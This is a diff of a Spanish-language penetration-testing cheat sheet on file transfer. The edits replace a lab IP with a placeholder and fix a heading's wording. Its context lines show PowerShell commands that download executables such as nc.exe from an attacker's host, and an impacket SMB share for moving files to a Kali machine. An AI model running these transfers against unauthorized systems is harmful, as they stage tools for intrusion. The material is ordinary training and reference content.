@@ -52,8 +52,7 @@ Invoke-WebRequest http://ip/file.exe -OutFile file.exe
 # PowerShell 2
 powershell.exe -c &quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://ip/file.exe&#x27;,&#x27;file.exe&#x27;)&quot;
 # PowerShell 3
-powershell -c &quot;(New-Object Net.WebClient).DownloadFile(&#x27;http://10.10.168.141:
-8080/nc.exe&#x27;,&#x27;nc.exe&#x27;)&quot;</code></pre>
+powershell -c &quot;(New-Object Net.WebClient).DownloadFile(&#x27;http://&lt;ip_linux&gt;:8080/nc.exe&#x27;,&#x27;nc.exe&#x27;)&quot;</code></pre>
             </section>
             <section class="code-card">
               <h3>Comando scp</h3>
@@ -72,7 +71,7 @@ impacket-smbserver &lt;smbFolder&gt; $(pwd) -smb2support
 copy \\&lt;kali_ip&gt;\&lt;smbFolder&gt;\file.txt .</code></pre>
             </section>
             <section class="code-card">
-              <h3>impacket-smbserver con unidades del almacenamiento</h3>
+              <h3>impacket-smbserver con unidades de almacenamiento</h3>
               <pre><code># Desde Linux
 # Abrimos servidor smb
 impacket-smbserver &lt;smbFolder&gt; $(pwd) -smb2support 
